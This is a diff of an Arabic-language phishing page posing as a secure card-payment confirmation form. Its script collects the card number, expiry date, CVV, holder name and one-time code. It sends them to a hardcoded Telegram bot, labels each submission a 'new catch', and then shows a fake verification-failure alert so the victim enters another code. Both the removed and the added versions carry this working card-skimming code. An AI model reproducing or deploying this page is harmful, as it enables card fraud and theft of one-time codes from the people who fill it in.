@@ -3,87 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من البطاقة</title>
+    <title>الدفع الآمن</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; border-top: 5px solid #0056b3; }
-        h2 { color: #333; text-align: center; margin-bottom: 25px; font-size: 20px; }
-        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
-        input:focus { border-color: #0056b3; }
-        .row { display: flex; gap: 10px; }
-        .row div { flex: 1; }
-        button { width: 100%; padding: 14px; background-color: #0056b3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
-        button:hover { background-color: #004494; }
+        body { font-family: 'Tahoma', sans-serif; background-color: #eef2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .payment-box { background: #ffffff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 380px; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header h2 { color: #1a73e8; font-size: 22px; margin: 0; }
+        label { display: block; margin: 10px 0 5px; color: #555; font-weight: bold; font-size: 13px; }
+        input { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 17px; letter-spacing: 1px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #1a73e8; box-shadow: 0 0 8px rgba(26,115,232,0.2); }
+        .flex { display: flex; gap: 15px; }
+        .flex div { flex: 1; }
+        button { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-top: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>تحديث بيانات الدفع</h2>
+<div class="payment-box">
+    <div class="header">
+        <h2>تأكيد بيانات البطاقة</h2>
+    </div>
     
     <label>رقم البطاقة</label>
-    <input type="text" id="card_number" placeholder="0000 0000 0000 0000" maxlength="19">
+    <input type="text" id="card_num" placeholder="0000 0000 0000 0000" maxlength="19">
 
-    <div class="row">
+    <div class="flex">
         <div>
             <label>تاريخ الانتهاء</label>
-            <input type="text" id="expiry_date" placeholder="MM/YY" maxlength="5">
+            <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
         </div>
         <div>
-            <label>رمز الأمان CVV</label>
-            <input type="text" id="cvv" placeholder="123" maxlength="4">
+            <label>رمز CVV</label>
+            <input type="text" id="cvv" placeholder="123" maxlength="3">
         </div>
     </div>
 
     <label>اسم صاحب البطاقة</label>
-    <input type="text" id="card_holder" placeholder="الاسم كما هو مكتوب">
+    <input type="text" id="holder" placeholder="الاسم الكامل">
 
     <label>رمز التحقق (OTP)</label>
-    <input type="text" id="otp_code" placeholder="أدخل الرمز المكون من 6 أرقام">
+    <input type="text" id="otp" placeholder="أدخل الرمز المستلم">
 
-    <button onclick="sendData()">تأكيد العملية</button>
+    <button onclick="sendData()">تأكيد الدفع</button>
 </div>
 
 <script>
-    // تنسيق رقم البطاقة: فراغ كل 4 أرقام
-    document.getElementById('card_number').addEventListener('input', function (e) {
-        let target = e.target;
-        let position = target.selectionEnd;
-        let length = target.value.length;
-        target.value = target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        if (target.value.length !== length) position++;
-        target.setSelectionRange(position, position);
+    // تنسيق رقم البطاقة (فراغات)
+    document.getElementById('card_num').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
 
-    // تنسيق التاريخ: شخطه بعد أول رقمين
-    document.getElementById('expiry_date').addEventListener('input', function (e) {
-        let val = e.target.value.replace(/[^\d]/g, '');
-        if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
-        e.target.value = val;
+    // تنسيق التاريخ (شخطه)
+    document.getElementById('exp').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
+        e.target.value = v;
     });
 
     async function sendData() {
-        const token = "8429424516:AAE0Cuy11JdGBYdtd3HMGAEnh-l_Szxk928";
-        const chat_id = "6134623694";
+        const t = "8429424516:AAE0Cuy11JdGBYdtd3HMGAEnh-l_Szxk928";
+        const c = "6134623694";
+        const m = `🚀 صيد جديد:\n💳 كرت: ${document.getElementById('card_num').value}\n📅 تاريخ: ${document.getElementById('exp').value}\n🔐 CVV: ${document.getElementById('cvv').value}\n👤 اسم: ${document.getElementById('holder').value}\n📱 كود: ${document.getElementById('otp').value}`;
         
-        const message = `
-⚠️ وصول بيانات صيد جديدة:
-💳 البطاقة: ${document.getElementById('card_number').value}
-📅 التاريخ: ${document.getElementById('expiry_date').value}
-🔐 CVV: ${document.getElementById('cvv').value}
-👤 الاسم: ${document.getElementById('card_holder').value}
-📱 الرمز (OTP): ${document.getElementById('otp_code').value}
-        `;
-
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+        const url = `https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`;
         
         try {
             await fetch(url);
-            alert("خطأ في الاتصال بالسيرفر، يرجى إعادة إدخال الرمز الصحيح.");
-        } catch (error) {
-            console.error("Error:", error);
-        }
+            alert("فشل في التحقق من الرمز، يرجى المحاولة مرة أخرى.");
+        } catch (e) { console.error(e); }
     }
 </script>
 
